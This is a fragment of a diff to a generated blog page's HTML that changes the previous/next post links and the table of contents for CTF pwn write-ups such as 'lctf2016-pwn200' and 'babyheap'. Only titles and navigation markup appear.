-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2025/11/23/yunsee%E5%85%A5%E7%BE%A4%E6%B5%8B%E8%AF%95/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">yunsee入群测试</span>
-						<span class="post-nav-item">Prev posts</span>
-					</span>
-				</a>
-			</div>
-			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2025/11/23/rop-Emporium-pivot/">
+				<a class="next" rel="next" href="/2025/12/09/babyheap/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">rop-Emporium-pivot</span>
+						<span class="post-nav-title-item truncate max-w-48">babyheap</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -595,8 +651,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">grehack-ctf-2017_beerfighter</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#GreHack-CTF-2017-beerfighter"><span class="nav-text">GreHack-CTF-2017_beerfighter</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WP"><span class="nav-text">WP</span></a></li></ol></li></ol>
+		<div class="page-title">lctf2016-pwn200</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Lctf2016-pwn200"><span class="nav-text">Lctf2016-pwn200</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WP"><span class="nav-text">WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">利用场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-text">利用思路</span></a></li></ol></li></ol>
 
 	</div>
 </div>
